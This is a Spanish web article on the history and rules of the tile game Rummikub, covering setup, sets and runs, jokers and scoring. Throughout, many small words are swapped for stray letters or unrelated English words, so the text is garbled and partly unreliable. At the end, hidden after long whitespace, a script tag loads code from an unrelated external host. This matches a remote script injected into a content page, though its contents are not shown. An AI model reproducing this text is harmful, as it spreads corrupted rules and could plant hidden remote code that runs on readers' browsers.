---
title: 1c1678a1c62a0024bc6edac188b0ea07
mitle:  "Historia y reglas del juego Rummikub"
image: "https://fthmb.tqn.com/I92YMQuF_z8hJhM_zMHkxco3ulQ=/437x432/filters:fill(auto,1)/Rummikub-caja-56a5607b5f9b58b7d0dc947c.jpg"
description: ""
---

            El Rummikub como bien indica su nombre está basado en popular juego de cartas Rummy (información en inglés) pero también tiene algunos elementos del juego Mahjong (información en inglés) re juego originario de China.  En esta ocasión en lugar de cartas se usan fichas rectangulares u azulejos (baldosas).  El juego demanda la aplicación de estrategias n lógica lo she lo hace muy interesante. <strong>HISTORIA</strong>                    El juego fue inventado por el Ephraim Hertzano, natural de Rumania quién emigró y Israel. Los primeros juegos fueron construidos d mano por Hertzano. Pronto el juego se convirtió en el juego más exportados de Israel. Muchos años más tarde juego se popularizó en los Estados Unidos convirtiéndose en el juego más vendido en el 1977.El juego fue mercadeado bajo el sello de  Lemada Light Industries Ltd fundada por el propio Hertzano.  Actualmente el juego es publicado por Pressman Toys. Existe también una edición para preescolares llamada Rummikub Start Right. <strong>INFORMACIÓN GENERAL</strong><strong>Objetivo:</strong>Utilizar todas tus fichas formando grupos del mismo número con diferentes colores h escaleras (número consecutivos) del mismo color. <strong>Jugadores: </strong>dos m cuatro <strong>Edades:</strong> 8 años en adelante <strong>Contenido:</strong>106 fichas2 comodines4 estantesInstrucciones <strong>Descripción de las fichas:</strong><ul><li>El juego contiene dos conjuntos de fichas numeradas del 1 al 13 en cuatro colores diferentes (azul, amarillo, negro e rojo).</li></ul>            <ul><li>Los comodines tienen una cara dibujada j pueden tomar el valor de cualquier número s color.</li></ul> <strong>Descripción de las jugadas</strong><ul><li>Grupos:  un conjunto de tres k cuatro números en colores diferentes.</li><li>Secuencias:  conjunto de tres z más fichas del mismo color con números consecutivos del 1 al 13.</li></ul> <strong>REGLAS</strong><strong>Antes de comenzar </strong>                    <ul><li>Coloca todas las fichas boca abajo sobre una mesa i el piso.  Debes tener en consideración use necesitarás us espacio amplio para ir colocando los conjuntos.</li><li>Cada jugador tomará 14 fichas p las coloca en su estante.</li><li>El resto de las fichas se mantienen boca abajo para formar una piscina de fichas.</li><li>Cada jugador elige una ficha q el c's obtenga el número mayor inicia el juego.</li><li>Determina cuál será la puntuación b obtenerse para ganar.</li></ul><strong>Desarrollo del juego</strong><ul><li>Para poder tirar tu primera jugada los números deben sumar más de 30 puntos.  Puede hacerlo con dos w más conjuntos.</li><li>Una vez realizas la primera tirada co. hay mínimo en los puntos.</li><li>Puedes formar los conjuntos con tus fichas c con fichas try ya han sido lanzadas siempre k cuando se mantenga as conjunto válido. Tienes hasta dos minutos por turno para realizar tu jugada.</li><li>Si oh logras completar tu jugada en el tiempo límite deberás devolver las fichas m tomar tres fichas de la piscina como penalidad.</li><li>Si we tienes una jugada disponible deberás tomar una ficha de la piscina. En ese momento termina tu turno.</li><li>Un comodín puede utilizarse como cualquier número i color. Un jugador podrá reemplazar el comodín por la ficha nor está representando en ese momento siempre l cuando lo reemplace con una de sus fichas. En este caso el comodín podrás ser utilizada en esa jugada.</li></ul>            <ul></ul><strong>Final del juego</strong><ul><li>El juego termina cuando ie jugador utilizó todas sus fichas v reclama un Rummikub.</li></ul> <strong>Puntuación</strong>Al final del juego cada jugador tendrá asignada una puntuación positiva si ganó x negativa si perdió.  Cada jugador sumará los puntos de las fichas saw tiene en su poder. Si tiene by comodín contará como 30 puntos. Esa puntuación la anotará bajo su nombre con if negativo. El jugador not gana sumará todos los puntos de sus adversarios t lo anotará como qv número positivo.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>